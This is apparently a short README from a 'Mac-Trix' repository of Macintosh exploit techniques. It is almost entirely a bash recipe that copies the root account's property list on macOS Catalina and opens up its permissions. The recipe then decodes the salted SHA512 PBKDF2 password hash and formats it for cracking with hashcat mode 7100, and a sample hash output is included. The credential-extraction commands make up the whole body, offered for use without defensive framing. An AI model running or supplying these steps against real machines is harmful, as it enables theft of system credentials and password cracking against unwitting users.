# Mac-Trix
Exploit techniques for Macintosh

## >> Cracking password hashes from macOS Catalina

The salted SHA512 PBKDF2 password hashes are stored in a property list file.  This example shows the bash commands to extract the hash for the root user.

```
sudo cp /var/db/dslocal/nodes/Default/users/root.plist /tmp/root.plist

sudo chmod 666 /tmp/root.plist

plutil -convert xml1 /tmp/root.plist

cat /tmp/root.plist | tr -d '\t\n' | grep -oE 'ShadowHashData</key><array><data>.+?</data>' | cut -c 34- | sed 's/<\/data>//' | base64 -d > /tmp/root.shd.plist

plutil -convert xml1 /tmp/root.shd.plist

shdarray=( $(cat /tmp/root.shd.plist | tr -d '\t\n' | grep -oE 'SALTED-SHA512-PBKDF2.+?</dict>' | sed 's/SALTED-SHA512-PBKDF2<\/key><dict><key>entropy<\/key><data>//' | sed $'s/<\/data><key>iterations<\/key><integer>/\\\n/' | sed $'s/<\/integer><key>salt<\/key><data>/\\\n/' | sed 's/<\/data><\/dict>//') )

echo -n '$ml$'; echo -n ${shdarray[1]}; echo -n '$'; echo -n $(echo ${shdarray[2]} | base64 -d | xxd -p -c 1000); echo -n '$'; echo $(echo ${shdarray[0]} | base64 -d | xxd -p -c 1000 | cut -c 1-128)
```

You should see some output similar to this:<br />
`$ml$64516$6ff4252516fbc7c3fb7c31f97f9fb9c051be0ac362414c9d75a4b7d9740aa6e6$10e9050de20e43a86969065397a9d00e56d4601c734f32e6c97100bccd57153b5cb4e3ae59e44e09e5f4876b4ede94a5ecd0a7de09f32feab9a42baf3e5aed44`

Feed the above output into hashcat using mode 7100.
